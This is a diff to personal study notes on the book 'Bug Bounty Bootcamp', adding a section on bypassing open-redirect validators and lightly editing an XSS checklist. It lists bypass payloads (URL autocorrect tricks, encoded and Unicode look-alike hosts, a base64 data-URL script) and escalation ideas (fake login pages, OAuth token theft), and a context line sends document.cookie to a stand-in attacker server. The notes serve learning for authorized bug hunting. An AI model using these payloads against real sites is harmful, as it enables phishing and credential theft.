@@ -1305,8 +1305,6 @@ location='http://attacker_server_ip/c='+document.cookie;
 
 **Finding Your First XSS!**
 
-"
-
 1. Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS.
 2. Insert XSS payloads into the user input fields you've found. Insert payloads from lists online, a polyglot payload, or a generic test string.
 3. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.
@@ -1314,7 +1312,6 @@ location='http://attacker_server_ip/c='+document.cookie;
 5. Automate teh XSS hunting process with techniques introduced in Chapter 25.
 6. Consider the impact of the XSS you've found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you've found?
 7. Send your first XSS report to a bug bounty program!
-   "
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
 
@@ -1410,6 +1407,98 @@ Step 4: Test for Referer-Based Open Redirects
   ```
   - Click the link on your domain to go to example.com and see if you are redirected automatically or after performing a user action.
 
-**Bypassing Open-Redirect Protection**
+#### Bypassing Open-Redirect Protection
+
+- Author states that they find open-redirects in almost all of the URLs they attack. This is mainly because different browsers interpret redirects differently and so redirect traffic differently.
+  - You can often find an open-redirect in one browser, but not in another.
+
+**Using Browser Autocorrect**
+
+- "Browsers often autocorrect URLs that don't have the correct components, in order to correct mangled URLs caused by user typos. For example, Chrome will interpret all of these URLs as pointing to https://attacker.com"
+  `https:attacker.com`
+  `https;attacker.com`
+  `https:\/\/attacker.com`
+  `https:/\/\attacker.com`
+  - Bypass URL validation based on a blocklist by intentionally misspelling the url.
+    - If any URL containing https:// or http:// is blocked by the application, try misspelling it as https;// and see if it works.
+- ex. `https://attacker.com\@example.com`
+  - If the `\` is interpreted as a path separator, it will interpret the hostname to be example.com and attacker.com\ as the username portion of the URL.
+  - If the browser autocorrects the backslash to a forward slash, it will redirect to attacker.com and treat @example.com as the path portion of the URL.
+    - `https://attacler.com/@example.com`
+
+**Exploiting Flawed Validator Logic**
+
+- URL validators often check to see if the redirect starts with, contains, or ends with the site's domain listed on the allowlist.
+  - Create a subdomain or directory with the target's domain name:
+    `https://example.com/login?redir=http://example.com.attacker.com` or
+    `https://example.com/login?redir=http://attacker.com/example.com`
+  - To bypass validators that require URLs to both start and end with a domain listed on the allowlist:
+    `https://example.com/login?redir=https://example.com.attacker.com/example.com`
+    - The browser interprets the first example.com as the subdomain and the second as the filepath.
+  - Use the at symbol (@) to make the first example.com the username portion of the URL:
+    `https://example.com/login?redir=https://example.com@attacker.com/example.com`
+  - Custom URL validators are prone to these attackers because usually not all edge cases are considered.
+
+**Using Data URLs**
+
+- Manipulate the scheme portion of the URL to fool validators:
+  - Format: `data:MEDIA_TYPE[;base64],DATA`
+  - Plain text message with this data scheme: `data:text/plain,hello!`
+  - To base64 encode the above: `data:text/plain;base64,aGVsbG8h`
+  - Base64-encoded redirect URL to evade validator: `data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=`
+    - The high entropy string is base64 encoded: `<script>location="https://example.com"</script>`
+    - The usage looks like this: `https://example.com/login?redir=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=`
+
+**Exploiting URL Decoding**
+
+- URL-encoding converts special characters into % followed by two hex digits. ex. / = %2f.
+- Validators and browsers both decode URLs from their URL encoded forms to find out what is contained in the URL.
+  - If the browser and the validator decode the characters differently, you can exploit this.
+
+_Double Encoding_
+
+- Double or triple encode special characters in your payloads:
+  - Single encoded / : `https://example.com%2f@attacker.com`
+  - Double encoded / : `https://example.com%252f@attacker.com`
+  - Triple encoded / : `https://example.com%25252f@attacker.com`
+- If the browser doesn't double decode URLs, but the browser does, you can use this payload:
+  `https://attacker.com%252f@example.com`
+  - The validator sees example.com as the hostname, but the browser redirects to attacker.com.
+
+_Non-ASCII Characters_
+
+- Some browsers decode non-ASCII characters into question marks.
+  - If this is the case: `https://attacker.com%ff.example.com` the validator would interpreted as example.com being the domain name, and attacker.comÿ as the subdomain.
+    - If the browser decodes the non-ASCII character as a ?, then it interprets it as `https://attacker.com?.example.com` where example.com is part of the URL query, not the hostname, and the browser would navigate to attacker.com.
+- Browsers also often try to find "most alike" substitutions when given special characters for example ╱ (%E2%95%B1) will often be subsituted with /.
+  - `https://attacker.com╱.example.com` may make it past the validator and be converted by the browser into `https://attacker.com/.example.com`
+  - "The _Unicode_ standard is a set of code developed to represent all of the world's languages on the computer. You can find a list of Univode characters at [http://www.unicode.org/charts/. Use the Unicode chart to find look-alike characters and insert them into URLs to bypass filters. The \*Cyrillic character set is especially useful since it contains many characters similar to ASCII characters."
+
+_Combining Exploit Techniques_
+
+- ex. `https://example.com%252f@attacker.com/example.com`
+  - Bypasses protection that only checks URL contains, starts with, or ends with an allowlisted hostname by making the URL both start and end with example.com.
+  - Most browsers interpret `example.com%252f` as the username portion of the URL.
+  - If the validator over decodes the URL, it will see example.com as the hostname portion: `https://example.com/@attacker.com/example.com`
+
+**Escalating the Attack**
+
+- Sending an email with a URL that looks like: `https://example.com/login?next=https://attacker.com/fake_login.html` to a user that redirects to an attackers fake login page that looks like the legitimate site could be a good way to steal creds.
+  - The victim may see a login error on the malicious page that reads something like: "Sorry! The password you provided was incorrect. Please enter your username and password again."
+  - Bonus points for redirecting the victim back to the legitimate site to keep them from catching on.
+- Use open-redirects to bypass blocklists and allowlists:
+  - `https://example.com/?next=https://attacker.com/` could bypass well build validators because it's technically still on the legitimate website.
+  - "If a site utilizes an allowlist to prevent SSRFs, and allows requests to only a list of redefined URLs, an attacker can utilize an open redirect within those allowlisted pages to redirect the request anywhere."
+- Use open-redirects to steal credentials and 0Auth tokens.
+  - Browsers often include the originating URL as a referer HTTP request header, the originating URL contains sensitive information like authentication tokens.
+  - You can use an open-redirect to steal the tokens via the referer header.
+
+**Finding Your First Open Redirect!**
+
+1. Search for redirect URL parameters. These might be vulnerable to parameter-based open redirect.
+2. Search for pages that perform referer-based redirects. These are candidates for a referer-based open redirect.
+3. Test the pages and parameters you've found for open redirects.
+4. If the server blocks the open redirect, try the protection bypass techniques mentioned in this chapter.
+5. Brainstorm ways of using the open redirect in your other bug chains!
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
